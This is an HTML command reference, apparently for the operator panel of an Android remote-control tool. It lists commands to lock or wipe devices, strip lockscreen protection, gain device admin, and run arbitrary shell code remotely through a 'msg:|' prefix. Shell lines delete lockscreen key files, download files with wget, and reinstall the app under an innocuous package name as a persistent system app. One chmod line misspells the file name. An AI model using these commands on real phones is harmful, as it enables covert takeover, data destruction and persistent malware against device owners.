Command List:
<hr><hr>
	<div class="ph_maindiv_content">
This Page contains a (hopefully) usefull List of Commands, you can send to the Devices.<br><br>
It contains App Related Commands, as well basic and experienced Android Commands.
	</div>
<hr>
<div class="ph_maindiv_content"></div>
<hr>
App Related Commands:
<hr>
LOCK!<br>
Turns the Display off.<br><br>
Vidit7861<br>
Wipes the Device and its Data (Requires Device Admin!)<br><br>
WIPEALL!1!<br>
Wipes the Device and all External Storages (Requires Device Admin!)<br><br>
RemovePattern<br>
Removes the Screen Protection from the Phone<br><br>
UNLOCK!<br>
Removes the Screen Protection from the Phone (Identically to RemovePattern)<br><br>
install<br>
Installs the App as System-App<br><br>
admin<br>
Shows a Window, in which the User has to press Accept. After he presses Accept, the App gets Device Admin<br><br>
msg:|<br>
Executes Code, if Device is rooted, it uses SU, if its not rooted, it uses SH.<br><br>
<hr>
<div class="ph_maindiv_content"></div>
<hr>
Remote Code Execution (RCE) Examples
<hr>
With the command "msg:|" you are able to Remotely Execute Code on other Devices.<br><br>
The Usage is: msg:|CODE, all behind the | counts as code.<br>
Example: "msg:|ls /sdcard/" - Lists the content of the SD CARD<br><br><br>
<hr>
Usefull Commands: (to use with msg:|$ , where $ is the code from below)
<hr>
<br>
Information: Most general Linux commands are working! Try it out on your Device with a Terminal Emulator if youre unsure if it will work!<br><br><br>
reboot<br>
Reboots Device<br><br>
reboot -p<br>
Shuts Down Device<br><br>
am start -n package/Activity<br>
Starts the selected Activity from the selected Package<br>
Example: am start -n com.android.classic/.DEBUG<br><br>
pm disable packagename<br>
Disables App<br>
Example: pm disable com.android.classic<br><br>
pm enable packagename<br>
Enables App<br>
Example: pm enable com.android.classic<br><br>
rm -rf /data/system/*.key<br>
Removes Lockscreen Protection<br><br>
wget http://example.com/superscript.sh /sdcard/superscript.sh<br>
Downloads a File to device<br><br>
<br><br>
The Following Commands convert the "Normal App" into a System App.<br><br>
mount -o remount,rw /system<br>
cat /data/app/com.android.classic* > /system/app/com.android.classic.apk<br>
chown root:root /system/app/com.android.classic.apk<br>
chmod 644 /system/app/com.android.classic.aok<br>
rm -rf /data/app/com.android.classic*<br>
mount -o remount,ro /system<br>
reboot<br><br>
Mounts System Read/Write, Copies the App into System, Deletes the "Normal-App", Mounts System Read-Only, Owns the File and sets Permissions, reboots<br><br>
<br><br>
<hr>
<div class="ph_maindiv_content"><br>EOF</div>
<hr><hr>
</body>
</html>